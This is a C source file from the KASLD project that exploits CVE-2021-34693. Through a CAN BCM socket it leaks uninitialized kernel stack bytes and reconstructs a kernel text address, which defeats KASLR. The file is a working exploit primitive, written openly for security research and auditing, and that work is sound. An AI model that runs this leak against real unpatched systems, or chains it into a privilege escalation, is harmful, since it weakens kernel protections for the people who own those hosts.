// This file is part of KASLD - https://github.com/bcoles/kasld
//
// Leak kernel stack pointer from CAN BCM bcm_msg_head struct
// uninitialized 4-byte hole (CVE-2021-34693).
//
// Mostly taken from original PoC by Norbert Slusarek:
// https://www.openwall.com/lists/oss-security/2021/06/15/1/2
//
// Leak primitive:
//   Data leaked:      kernel stack pointer (uninitialized struct padding)
//   Kernel subsystem: net/can — CAN BCM (net/can/bcm.c)
//   Data structure:   struct bcm_msg_head (4-byte padding hole after flags)
//   Address type:     virtual (kernel stack)
//   Method:           heuristic
//   CVE:              CVE-2021-34693
//   Patched:          v5.12 (multiple commits)
//   Status:           fixed in v5.12
//   Access check:     none pre-v5.12 (AF_CAN socket creation, unprivileged)
//   Source:
//   https://elixir.bootlin.com/linux/v5.11/source/net/can/bcm.c
//
// Mitigations:
//   Patched in v5.12. Requires CONFIG_CAN=y and CONFIG_CAN_BCM=y/m.
//   AF_CAN socket creation may be restricted by LSM or network namespace
//   policy. No runtime sysctl can restrict access.
//
// References:
// https://nvd.nist.gov/vuln/detail/CVE-2021-34693
// https://www.openwall.com/lists/oss-security/2021/06/15/1
// https://www.openwall.com/lists/oss-security/2021/06/15/1/2
// ---
// <bcoles@gmail.com>

#include "include/kasld/api.h"
#include "include/kasld/cli.h"
#include <fcntl.h>
#include <linux/can.h>
#include <linux/can/bcm.h>
#include <stdarg.h>
#include <stddef.h> /* offsetof */
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <sys/time.h>
#include <unistd.h>

KASLD_EXPLAIN(
    "Exploits CVE-2021-34693: the CAN BCM RX_SETUP handler built its "
    "reply bcm_msg_head on the kernel stack and copied the ival1, ival2, "
    "and can_id fields to userspace without zeroing them. Reading the "
    "reply back via recvfrom() returns uninitialised kernel-stack bytes "
    "in the high half of ival2.tv_sec, which often holds a kernel text "
    "or stack virtual address. Fixed in v5.12.");

KASLD_META("method:heuristic\n"
           "phase:probing\n"
           "live:1\n"
           "addr:virtual\n"
           "cve:CVE-2021-34693\n"
           "patch:v5.12\n"
           "config:CONFIG_CAN\n"
           "config:CONFIG_CAN_BCM\n");

/* The bcm_msg_head struct's last field `frames[]` is a C99 flexible array
 * member, so wrapping it in a containing struct (the kernel's own pattern
 * for sending bcm_msg_head + a fixed number of frames in one buffer) is
 * flagged under -Wpedantic. The layout matches the kernel's expected wire
 * format — we deliberately rely on it. Suppress the pedantic warning at
 * the two declaration sites rather than hide the kernel-side shape. */
#pragma GCC diagnostic push
#pragma GCC diagnostic ignored "-Wpedantic"

static void rxsetup_sock(int sock) {
  struct sockaddr_can sa;
  struct {
    struct bcm_msg_head b;
    struct canfd_frame f;
  } msg;

  memset(&msg, 0, sizeof(msg));

  sa.can_family = AF_CAN;
  sa.can_ifindex = 0;
  sa.can_addr.tp.rx_id = 0;
  sa.can_addr.tp.tx_id = 0;

  msg.b.opcode = RX_SETUP;
  msg.b.flags = CAN_FD_FRAME | SETTIMER | STARTTIMER;
  msg.b.count = 0;
  msg.b.ival1.tv_sec = msg.b.ival2.tv_sec = 0;
  msg.b.ival1.tv_usec = msg.b.ival2.tv_usec = 1;
  msg.b.can_id = 0;
  msg.b.nframes = 1;

  sendto(sock, &msg, sizeof(msg), 0, (struct sockaddr *)&sa, sizeof(sa));
}

static unsigned long get_kernel_addr_from_bcm_msg_head_struct(void) {
  int sock;
  struct sockaddr_can sa;
  struct {
    struct bcm_msg_head b;
    struct canfd_frame f;
  } msg;
  char addrs[9];
  char buf[sizeof(msg)];
  char *endptr;
  unsigned long addr = 0;

  kasld_info("trying bcm_msg_head struct stack pointer leak ...");

  sock = socket(AF_CAN, SOCK_DGRAM, CAN_BCM);

  /* Bound the blocking recvfrom() below. On kernels where the RX_SETUP reply
   * never arrives — CAN_BCM absent, or a 32-bit layout mismatch so the kernel
   * rejects the message — the read would otherwise block forever. A short
   * timeout keeps the probe live but non-hanging; a vulnerable kernel's
   * SETTIMER reply lands well within it. Harmless if sock < 0. */
  struct timeval rcvtv = {.tv_sec = 2, .tv_usec = 0};
  setsockopt(sock, SOL_SOCKET, SO_RCVTIMEO, &rcvtv, sizeof(rcvtv));

  sa.can_family = AF_CAN;
  sa.can_ifindex = 0;
  sa.can_addr.tp.rx_id = 0;
  sa.can_addr.tp.tx_id = 0;

  connect(sock, (struct sockaddr *)&sa, sizeof(sa));

  rxsetup_sock(sock);

  memset(&sa, 0, sizeof(sa));
  sa.can_family = AF_CAN;
  sa.can_ifindex = 0;
  socklen_t len = 0;

  memset(&msg, 0, sizeof(msg));

  recvfrom(sock, &msg, sizeof(msg), 0, (struct sockaddr *)&sa, &len);

  memcpy(buf, &msg, sizeof(buf));

  /* Leak position. The pre-v5.12 BCM code constructed its reply
   * `struct bcm_msg_head` on the kernel stack and copied it to userspace
   * without first zeroing ival1 / ival2 / can_id (CVE-2021-34693). Those
   * fields ride back to userspace carrying whatever kernel-stack bytes
   * occupied that frame.
   *
   * The Slusarek PoC empirically reads the high half of `ival2.tv_sec`
   * (a 64-bit `long` on LE64 kernels), where a kernel pointer reliably
   * lands for this particular call chain. Express the offset symbolically
   * against the struct so the position survives any future layout change
   * and so the read site documents itself: ival2 sits at offset 32 on
   * LE64, and +sizeof(uint32_t) selects the upper 32 bits of the 8-byte
   * tv_sec.
   *
   * Gated to 64-bit hosts only. On a 32-bit kernel `long` is 4 bytes, so
   * `bcm_timeval` is 8 bytes and `ival2` sits at a different offset; the
   * upper-half-of-tv_sec leak shape doesn't apply. We bail rather than
   * silently produce a non-pointer value. */
#if __SIZEOF_LONG__ >= 8
  /* __extension__ silences -Wpedantic: _Static_assert is a C11 keyword gcc
   * supports as an extension, and the tree builds -std=c99 -pedantic. */
  __extension__ _Static_assert(
      offsetof(struct bcm_msg_head, ival2) == 32 &&
          sizeof(struct bcm_timeval) == 16,
      "bcm_msg_head layout drift: the leak read below "
      "targets ival2.tv_sec's high half; recompute the "
      "offset if the struct moves.");

  if (sizeof(buf) < 112)
    return 0;

  const size_t leak_off =
      offsetof(struct bcm_msg_head, ival2) /* = 32: start of ival2.tv_sec */
      + sizeof(uint32_t); /* = 36: high half of tv_sec on LE64 */
  /* Cast through unsigned char: buf is signed, so a leaked byte >= 0x80 would
   * sign-extend to 0xffffff80.. and print eight hex digits under %02x,
   * corrupting the reconstructed address (kernel pointers have 0xff high
   * bytes, so this fires on every real leak). */
  snprintf(addrs, sizeof(addrs), "%02x%02x%02x%02x",
           (unsigned char)buf[leak_off + 3], (unsigned char)buf[leak_off + 2],
           (unsigned char)buf[leak_off + 1], (unsigned char)buf[leak_off + 0]);

  addr = strtoul(addrs, &endptr, 16);

  if (kasld_addr_is_kernel_text(addr))
    return addr;
#else
  (void)buf;
  (void)addrs;
  (void)endptr;
  (void)addr;
  kasld_err("BCM bcm_msg_head leak shape targets a 64-bit kernel; skipping");
#endif

  return 0;
}

#pragma GCC diagnostic pop

int main(void) {
  if (kasld_skip_live_probe("CAN BCM"))
    return 0;
  /* Live socket probe: opens a CAN BCM socket and recvfrom()s a reply. */
  unsigned long addr = get_kernel_addr_from_bcm_msg_head_struct();
  if (!addr) {
    kasld_err("no kernel address leaked via BCM socket");
    return 0;
  }

  kasld_found("leaked stack pointer: %lx", addr);
  kasld_info("possible kernel base: %lx", kasld_floor_text_base(addr));
  kasld_result_sample(KASLD_TYPE_VIRT, REGION_KERNEL_TEXT, addr,
                      "bcm_msg_head_struct", CONF_HEURISTIC);

  return 0;
}
